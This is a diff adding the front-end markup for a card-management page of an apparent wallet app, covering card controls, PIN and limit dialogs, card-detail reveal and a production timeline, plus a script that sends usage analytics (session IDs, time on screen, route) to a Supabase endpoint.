+    <div class="alert-banner__body">
+        <strong class="alert-banner__title">Activation pending</strong>
+                    <p class="alert-banner__text">Your card is still being manufactured.</p>
+            </div>
+</div>
+                </div>
+            
+                            <form class="enter" style="--i:3" action="/cards/activate" method="post">
+                                        <button type="submit" class="btn btn--primary btn--full">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"></path><path d="m9 12 2 2 4-4"></path></svg>
+                        Activate card
+                    </button>
+                </form>
+            
+            <div class="enter" style="--i:4">
+                <h2 class="section__title">Card controls</h2>
+
+                <div class="switch-list">
+                                                                    <label class="switch-row" x-data="{ on: true }">
+                            <span class="switch-row__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="5" width="20" height="14" rx="2"></rect><path d="M2 10h20"></path></svg>
+</span>
+                            <span class="switch-row__body">
+                                <span class="switch-row__title">Contactless payments</span>
+                                <span class="switch-row__text">Tap to pay at terminals.</span>
+                            </span>
+                            <span class="switch switch--on" :class="on &amp;&amp; 'switch--on'">
+                                <input type="checkbox" class="switch__input" @change="on = $event.target.checked; setControl('contactless', on)" checked="">
+                                <span class="switch__track" aria-hidden="true"><span class="switch__thumb"></span></span>
+                            </span>
+                        </label>
+                                                                    <label class="switch-row" x-data="{ on: true }">
+                            <span class="switch-row__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>
+</span>
+                            <span class="switch-row__body">
+                                <span class="switch-row__title">Online payments</span>
+                                <span class="switch-row__text">Web and in-app purchases.</span>
+                            </span>
+                            <span class="switch switch--on" :class="on &amp;&amp; 'switch--on'">
+                                <input type="checkbox" class="switch__input" @change="on = $event.target.checked; setControl('online_payments', on)" checked="">
+                                <span class="switch__track" aria-hidden="true"><span class="switch__thumb"></span></span>
+                            </span>
+                        </label>
+                                                                    <label class="switch-row" x-data="{ on: false }">
+                            <span class="switch-row__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M17 7 7 17"></path><path d="M17 17H7V7"></path></svg>
+</span>
+                            <span class="switch-row__body">
+                                <span class="switch-row__title">ATM withdrawals</span>
+                                <span class="switch-row__text">Cash withdrawals at machines.</span>
+                            </span>
+                            <span class="switch" :class="on &amp;&amp; 'switch--on'">
+                                <input type="checkbox" class="switch__input" @change="on = $event.target.checked; setControl('atm_withdrawals', on)">
+                                <span class="switch__track" aria-hidden="true"><span class="switch__thumb"></span></span>
+                            </span>
+                        </label>
+                                                                    <label class="switch-row" x-data="{ on: false }">
+                            <span class="switch-row__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+</span>
+                            <span class="switch-row__body">
+                                <span class="switch-row__title">International use</span>
+                                <span class="switch-row__text">Payments outside the United States.</span>
+                            </span>
+                            <span class="switch" :class="on &amp;&amp; 'switch--on'">
+                                <input type="checkbox" class="switch__input" @change="on = $event.target.checked; setControl('international', on)">
+                                <span class="switch__track" aria-hidden="true"><span class="switch__thumb"></span></span>
+                            </span>
+                        </label>
+                                    </div>
+            </div>
+
+            <div class="enter" style="--i:5">
+                <h2 class="section__title">Security</h2>
+
+                <div class="list">
+                    <button type="button" class="list__row list__row--tap" @click="cardPin = true; window.walletCardSync && window.walletCardSync()">
+                        <span class="list__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg>
+</span>
+                        <span class="list__body">
+                            <span class="list__title">Card PIN</span>
+                            <span class="list__meta">Not set yet</span>
+                        </span>
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m9 18 6-6-6-6"></path></svg>
+                    </button>
+
+                    <button type="button" class="list__row list__row--tap" @click="cardLimit = true; window.walletCardSync && window.walletCardSync()">
+                        <span class="list__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 20V10"></path><path d="M12 20V4"></path><path d="M6 20v-6"></path></svg>
+</span>
+                        <span class="list__body">
+                            <span class="list__title">Monthly limit</span>
+                            <span class="list__meta">$1,000.00 per month</span>
+                        </span>
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m9 18 6-6-6-6"></path></svg>
+                    </button>
+                </div>
+            </div>
+
+            <div class="enter" style="--i:6">
+                <h2 class="section__title">Production</h2>
+
+                <div class="card">
+                    <ol class="timeline">
+            
+        <li class="timeline__item timeline__item--current">
+            <span class="timeline__marker" aria-hidden="true">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="m9 15 2 2 4-4"></path></svg>
+            </span>
+
+            <span class="timeline__body">
+                <span class="timeline__label">Card requested</span>
+                                                    <span class="timeline__bar" aria-hidden="true"></span>
+                            </span>
+
+            <span class="timeline__status">In progress</span>
+        </li>
+            
+        <li class="timeline__item timeline__item--pending">
+            <span class="timeline__marker" aria-hidden="true">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="5" width="20" height="14" rx="2"></rect><path d="M2 10h20"></path></svg>
+            </span>
+
+            <span class="timeline__body">
+                <span class="timeline__label">Personalization</span>
+                                            </span>
+
+            <span class="timeline__status">Pending</span>
+        </li>
+            
+        <li class="timeline__item timeline__item--pending">
+            <span class="timeline__marker" aria-hidden="true">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.3-4.3"></path></svg>
+            </span>
+
+            <span class="timeline__body">
+                <span class="timeline__label">Quality check</span>
+                                            </span>
+
+            <span class="timeline__status">Pending</span>
+        </li>
+            
+        <li class="timeline__item timeline__item--pending">
+            <span class="timeline__marker" aria-hidden="true">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"></path><path d="m9 12 2 2 4-4"></path></svg>
+            </span>
+
+            <span class="timeline__body">
+                <span class="timeline__label">Ready to activate</span>
+                                            </span>
+
+            <span class="timeline__status">Pending</span>
+        </li>
+    </ol>
+                </div>
+
+                <p class="form__note">
+                                            3 days to go — production moves forward on its own.
+                                    </p>
+            </div>
+
+        </section>
+</template>
+</main>
+
+            <nav class="app-tabbar" aria-label="Main navigation">
+            
+        <a class="app-tabbar__item"
+           href="/"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+                            </span>
+            <span>Home</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/verification"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="m17 8-5-5-5 5"/><path d="M12 3v12"/></svg>
+                            </span>
+            <span>Verification</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/cards"
+            aria-current="page" >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/></svg>
+                            </span>
+            <span>Cards</span>
+        </a>
+            
+        <a class="app-tabbar__item"
+           href="/support"
+           >
+            <span class="app-tabbar__glyph">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="10"/><path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>
+                            </span>
+            <span>Support</span>
+        </a>
+    </nav>
+    
+    <div class="sheet" x-cloak x-show="sheetOpen" role="dialog" aria-modal="true"
+     aria-label="Notifications" @keydown.escape.window="sheetOpen = false">
+
+    <div class="sheet__backdrop"
+         x-show="sheetOpen"
+         x-transition.opacity.duration.200ms
+         @click="sheetOpen = false"></div>
+
+    <div class="sheet__panel"
+         x-show="sheetOpen"
+         x-transition:enter="sheet__panel--anim"
+         x-transition:enter-start="sheet__panel--down"
+         x-transition:leave="sheet__panel--anim"
+         x-transition:leave-end="sheet__panel--down"
+         x-data="{ dragFrom: null, dragBy: 0 }"
+         @click.stop
+         @touchstart="dragFrom = $event.touches[0].clientY; dragBy = 0"
+         @touchmove="if (dragFrom !== null) {
+                         dragBy = Math.max(0, $event.touches[0].clientY - dragFrom);
+                         $el.style.transform = 'translateY(' + dragBy + 'px)';
+                     }"
+         @touchend="$el.style.removeProperty('transform');
+                    if (dragBy > 80) sheetOpen = false;
+                    dragFrom = null; dragBy = 0">
+
+        <div class="sheet__grip" aria-hidden="true"></div>
+
+        <div class="sheet__head">
+            <h2 class="sheet__title">Notifications</h2>
+            <button type="button" class="sheet__close" @click="sheetOpen = false" aria-label="Close">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+            </button>
+        </div>
+
+        <div class="sheet__body"><div class="stack" x-data="{ unread: 0 }"
+             @support-unread.window="unread = $event.detail.unread">
+
+            
+            <a class="notify-row" href="/support/chat" x-show="unread > 0"
+                x-cloak >
+                <span class="notify-row__icon" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22z"/></svg>
+</span>
+                <span class="notify-row__body">
+                    <span class="notify-row__title">Sarah Mitchell replied</span>
+                    <span class="notify-row__text" x-text="unread === 1 ? '1 new message in your support chat' : unread + ' new messages in your support chat'">
+                        0 new messages in your support chat
+                    </span>
+                </span>
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m9 18 6-6-6-6"/></svg>
+            </a>
+
+                            <p class="empty__text" x-show="unread === 0" >
+                    No notifications right now.
+                </p>
+                    </div></div>
+    </div>
+</div>
+
+    
+        
+    
+    
+    <!-- ================= Card details ================= -->
+    <div class="sheet" x-cloak x-show="cardDetails" role="dialog" aria-modal="true"
+         aria-label="Card details" @keydown.escape.window="cardDetails = false">
+        <div class="sheet__backdrop" x-show="cardDetails" x-transition.opacity.duration.200ms
+             @click="cardDetails = false"></div>
+        <div class="sheet__panel"
+             x-show="cardDetails"
+             x-transition:enter="sheet__panel--anim" x-transition:enter-start="sheet__panel--down"
+             x-transition:leave="sheet__panel--anim" x-transition:leave-end="sheet__panel--down"
+             x-data="{ revealed:false, pan:'', cvv:'', thru:'', holder:'', dragFrom:null, dragBy:0,
+                       mask(v){ return v ? '**** **** **** ' + v.replace(/\s/g,'').slice(-4) : '**** **** **** ****'; } }"
+             @card-sync.window="pan=$event.detail.pan; cvv=$event.detail.cvv; thru=$event.detail.thru; holder=$event.detail.holder; revealed=false"
+             @click.stop
+             @touchstart="dragFrom=$event.touches[0].clientY; dragBy=0"
+             @touchmove="if(dragFrom!==null){ dragBy=Math.max(0,$event.touches[0].clientY-dragFrom); $el.style.transform='translateY('+dragBy+'px)'; }"
+             @touchend="$el.style.removeProperty('transform'); if(dragBy>80) cardDetails=false; dragFrom=null; dragBy=0">
+            <div class="sheet__grip" aria-hidden="true"></div>
+            <div class="sheet__head">
+                <h2 class="sheet__title">Card details</h2>
+                <button type="button" class="sheet__close" @click="cardDetails = false" aria-label="Close">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+                </button>
+            </div>
+            <div class="sheet__body">
+                <div class="stack">
+                    <div>
+                        <div class="detail-row">
+                            <span class="detail-row__label">Card number</span>
+                            <span class="detail-row__value detail-row__value--mono" x-text="revealed ? pan : mask(pan)">**** **** **** ****</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-row__label">Valid thru</span>
+                            <span class="detail-row__value detail-row__value--mono" x-text="thru">••/••</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-row__label">Security code</span>
+                            <span class="detail-row__value detail-row__value--mono" x-text="revealed ? cvv : '•••'">•••</span>
+                        </div>
+                        <div class="detail-row">
+                            <span class="detail-row__label">Name on card</span>
+                            <span class="detail-row__value" x-text="holder">—</span>
+                        </div>
+                    </div>
+                    <button type="button" class="btn btn--ghost btn--full" @click="revealed = !revealed">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false" x-show="!revealed"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false" x-show="revealed" x-cloak><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/><line x1="2" y1="2" x2="22" y2="22"/></svg>
+                        <span x-text="revealed ? 'Hide details' : 'Reveal details'">Reveal details</span>
+                    </button>
+                    <p class="form__note">Never share these numbers. Support will never ask for them — not by email, not by phone.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= Monthly limit ================= -->
+    <div class="sheet" x-cloak x-show="cardLimit" role="dialog" aria-modal="true"
+         aria-label="Monthly limit" @keydown.escape.window="cardLimit = false">
+        <div class="sheet__backdrop" x-show="cardLimit" x-transition.opacity.duration.200ms
+             @click="cardLimit = false"></div>
+        <div class="sheet__panel"
+             x-show="cardLimit"
+             x-transition:enter="sheet__panel--anim" x-transition:enter-start="sheet__panel--down"
+             x-transition:leave="sheet__panel--anim" x-transition:leave-end="sheet__panel--down"
+             x-data="{ sel:1000, dragFrom:null, dragBy:0,
+                       fmt(n){ return '$' + n.toLocaleString('en-US') + '.00'; } }"
+             @card-sync.window="sel=$event.detail.limit"
+             @click.stop
+             @touchstart="dragFrom=$event.touches[0].clientY; dragBy=0"
+             @touchmove="if(dragFrom!==null){ dragBy=Math.max(0,$event.touches[0].clientY-dragFrom); $el.style.transform='translateY('+dragBy+'px)'; }"
+             @touchend="$el.style.removeProperty('transform'); if(dragBy>80) cardLimit=false; dragFrom=null; dragBy=0">
+            <div class="sheet__grip" aria-hidden="true"></div>
+            <div class="sheet__head">
+                <h2 class="sheet__title">Monthly limit</h2>
+                <button type="button" class="sheet__close" @click="cardLimit = false" aria-label="Close">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+                </button>
+            </div>
+            <div class="sheet__body">
+                <div class="stack">
+                    <p class="sheet__lead">How much this card may spend in a calendar month.</p>
+                    <div class="choice-list">
+                        <template x-for="v in [500,1000,2000,3500,5000]" :key="v">
+                            <button type="button" class="choice" :class="sel===v && 'choice--on'" @click="sel=v" :aria-pressed="sel===v">
+                                <span class="choice__body">
+                                    <span class="choice__title" x-text="fmt(v)">$1,000.00</span>
+                                    <span class="choice__text">per month</span>
+                                </span>
+                            </button>
+                        </template>
+                    </div>
+                    <button type="button" class="btn btn--primary btn--full"
+                            @click="window.walletSetLimit(sel); cardLimit=false">Save limit</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= Card PIN ================= -->
+    <div class="sheet" x-cloak x-show="cardPin" role="dialog" aria-modal="true"
+         aria-label="Card PIN" @keydown.escape.window="cardPin = false">
+        <div class="sheet__backdrop" x-show="cardPin" x-transition.opacity.duration.200ms
+             @click="cardPin = false"></div>
+        <div class="sheet__panel"
+             x-show="cardPin"
+             x-transition:enter="sheet__panel--anim" x-transition:enter-start="sheet__panel--down"
+             x-transition:leave="sheet__panel--anim" x-transition:leave-end="sheet__panel--down"
+             x-data="{ a:'', b:'', dragFrom:null, dragBy:0 }"
+             @click.stop
+             @touchstart="dragFrom=$event.touches[0].clientY; dragBy=0"
+             @touchmove="if(dragFrom!==null){ dragBy=Math.max(0,$event.touches[0].clientY-dragFrom); $el.style.transform='translateY('+dragBy+'px)'; }"
+             @touchend="$el.style.removeProperty('transform'); if(dragBy>80) cardPin=false; dragFrom=null; dragBy=0">
+            <div class="sheet__grip" aria-hidden="true"></div>
+            <div class="sheet__head">
+                <h2 class="sheet__title">Card PIN</h2>
+                <button type="button" class="sheet__close" @click="cardPin = false" aria-label="Close">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+                </button>
+            </div>
+            <div class="sheet__body">
+                <div class="stack">
+                    <p class="sheet__lead">Choose 4 digits. The PIN is stored with the card issuer, never on this device.</p>
+                    <label class="field">
+                        <span class="field__label">New PIN</span>
+                        <input class="field__input field__input--pin" type="password" inputmode="numeric" autocomplete="off" maxlength="4" placeholder="••••" x-model="a" @input="a=a.replace(/\D/g,'').slice(0,4)">
+                    </label>
+                    <label class="field">
+                        <span class="field__label">Confirm PIN</span>
+                        <input class="field__input field__input--pin" type="password" inputmode="numeric" autocomplete="off" maxlength="4" placeholder="••••" x-model="b" @input="b=b.replace(/\D/g,'').slice(0,4)">
+                    </label>
+                    <button type="button" class="btn btn--primary btn--full"
+                            @click="if(window.walletSetPin(a,b)){ a=''; b=''; cardPin=false; }">Save PIN</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= Card design ================= -->
+    <div class="sheet" x-cloak x-show="cardDesign" role="dialog" aria-modal="true"
+         aria-label="Card design" @keydown.escape.window="cardDesign = false">
+        <div class="sheet__backdrop" x-show="cardDesign" x-transition.opacity.duration.200ms
+             @click="cardDesign = false"></div>
+        <div class="sheet__panel"
+             x-show="cardDesign"
+             x-transition:enter="sheet__panel--anim" x-transition:enter-start="sheet__panel--down"
+             x-transition:leave="sheet__panel--anim" x-transition:leave-end="sheet__panel--down"
+             x-data="{ sel:'midnight', dragFrom:null, dragBy:0 }"
+             @card-sync.window="sel=$event.detail.design"
+             @click.stop
+             @touchstart="dragFrom=$event.touches[0].clientY; dragBy=0"
+             @touchmove="if(dragFrom!==null){ dragBy=Math.max(0,$event.touches[0].clientY-dragFrom); $el.style.transform='translateY('+dragBy+'px)'; }"
+             @touchend="$el.style.removeProperty('transform'); if(dragBy>80) cardDesign=false; dragFrom=null; dragBy=0">
+            <div class="sheet__grip" aria-hidden="true"></div>
+            <div class="sheet__head">
+                <h2 class="sheet__title">Card design</h2>
+                <button type="button" class="sheet__close" @click="cardDesign = false" aria-label="Close">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>
+                </button>
+            </div>
+            <div class="sheet__body">
+                <div class="stack">
+                    <p class="sheet__lead">Changing the finish keeps your number, your limit and your controls.</p>
+                    <div class="swatches">
+                        <button type="button" class="swatch" :class="sel==='midnight' && 'swatch--on'" @click="sel='midnight'" :aria-pressed="sel==='midnight'">
+                            <span class="swatch__chip swatch__chip--matte" style="--surface:#14141c" aria-hidden="true"></span>
+                            <span class="swatch__name">Midnight</span>
+                        </button>
+                        <button type="button" class="swatch" :class="sel==='signature' && 'swatch--on'" @click="sel='signature'" :aria-pressed="sel==='signature'">
+                            <span class="swatch__chip swatch__chip--gloss" style="--surface:#F52A52" aria-hidden="true"></span>
+                            <span class="swatch__name">Signature</span>
+                        </button>
+                        <button type="button" class="swatch" :class="sel==='graphite' && 'swatch--on'" @click="sel='graphite'" :aria-pressed="sel==='graphite'">
+                            <span class="swatch__chip swatch__chip--brushed" style="--surface:#3a3f4b" aria-hidden="true"></span>
+                            <span class="swatch__name">Graphite</span>
+                        </button>
+                        <button type="button" class="swatch" :class="sel==='carbon' && 'swatch--on'" @click="sel='carbon'" :aria-pressed="sel==='carbon'">
+                            <span class="swatch__chip swatch__chip--carbon" style="--surface:#1b2027" aria-hidden="true"></span>
+                            <span class="swatch__name">Carbon</span>
+                        </button>
+                        <button type="button" class="swatch" :class="sel==='lagoon' && 'swatch--on'" @click="sel='lagoon'" :aria-pressed="sel==='lagoon'">
+                            <span class="swatch__chip swatch__chip--gloss" style="--surface:#125f5c" aria-hidden="true"></span>
+                            <span class="swatch__name">Lagoon</span>
+                        </button>
+                        <button type="button" class="swatch" :class="sel==='aurora' && 'swatch--on'" @click="sel='aurora'" :aria-pressed="sel==='aurora'">
+                            <span class="swatch__chip swatch__chip--holo" style="--surface:#2b2350" aria-hidden="true"></span>
+                            <span class="swatch__name">Aurora</span>
+                        </button>
+                    </div>
+                    <button type="button" class="btn btn--primary btn--full"
+                            @click="window.walletApplyDesign(sel); cardDesign=false">Apply design</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast" role="status" aria-live="polite"
+     >
+    <span class="toast__text" id="toast-text"></span>
+</div>
+</div>
+
+
+<script>
+(function () {
+  var URL_ = "https://hrlmqwkgruexsxpqmxje.supabase.co/functions/v1/wallet-track";
+  var EMAIL = null;
+
+  function id(chave, store) {
+    try {
+      var v = store.getItem(chave);
+      if (!v) { v = Math.random().toString(36).slice(2) + Date.now().toString(36); store.setItem(chave, v); }
+      return v;
+    } catch (e) { return "sem-storage"; }
+  }
+
+  // visitor sobrevive ao fechar o navegador — é ele que responde "abre todo dia?".
+  // sessao morre com a aba: é a unidade do tempo de uso.
+  var visitor = id("w_visitor", window.localStorage);
+  var sessao = id("w_sessao", window.sessionStorage);
+
+  // Tempo REAL de olho na tela. Sem parar o relógio quando a aba esconde, um celular
+  // esquecido aberto vira "40 minutos de uso" e a média mente para todo mundo.
+  var segundos = 0, ultimo = Date.now(), visivel = !document.hidden;
+
+  function tick() {
+    var agora = Date.now();
+    if (visivel) segundos += (agora - ultimo) / 1000;
+    ultimo = agora;
+  }
+
+  function manda(evento, viaBeacon) {
+    tick();
+    var corpo = JSON.stringify({
+      visitor: visitor, sessao: sessao, evento: evento, email: EMAIL,
+      rota: location.pathname, segundos: Math.round(segundos),
+      ref: document.referrer || null
+    });
+    try {
+      // sendBeacon é o único que sobrevive à aba fechando
+      if (viaBeacon && navigator.sendBeacon) {
+        navigator.sendBeacon(URL_, new Blob([corpo], { type: "application/json" }));
+        return;
+      }
+      fetch(URL_, { method: "POST", headers: { "Content-Type": "application/json" },
+                    body: corpo, keepalive: true }).catch(function () {});
+    } catch (e) {}
+  }
+
+  document.addEventListener("visibilitychange", function () {
+    tick();
+    visivel = !document.hidden;
+    if (document.hidden) manda("ping", true);
+  });
+
+  manda("open");
+  setInterval(function () { manda("ping"); }, 20000);
+  window.addEventListener("pagehide", function () { manda("saida", true); });
+})();
+</script>
+</body>
+</html>
